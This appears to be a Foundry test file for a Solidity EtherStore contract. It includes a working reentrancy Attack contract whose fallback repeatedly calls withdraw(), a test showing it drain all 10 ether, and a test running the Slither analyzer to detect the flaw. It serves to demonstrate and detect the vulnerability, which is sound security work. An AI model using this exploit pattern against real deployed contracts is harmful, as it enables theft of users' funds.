// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract EtherStoreTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    EtherStore public etherStore;
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.startPrank(signer);
        etherStore = new EtherStore();
        vm.deal(signer, 10 ether);
        etherStore.deposit{value: 10 ether}();
        vm.stopPrank();
    }

    function test_using_slither_to_detect() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "slither";
        cmds[1] = "src/EtherStore.sol";
        vm.ffi(cmds);
        // detect reentrancy: Reentrancy in EtherStore.withdraw() (src/EtherStore.sol#38-46)
    }

    function test_in_case_of_reentrancy() public {
        vm.deal(exploiter, 1 ether);
        vm.startPrank(exploiter);
        Attack attack = new Attack(address(etherStore));
        attack.attack{value: 1 ether}();
        vm.stopPrank();
        assertEq(address(attack).balance, 11 ether);
        assertEq(address(etherStore).balance, 0);
    }
}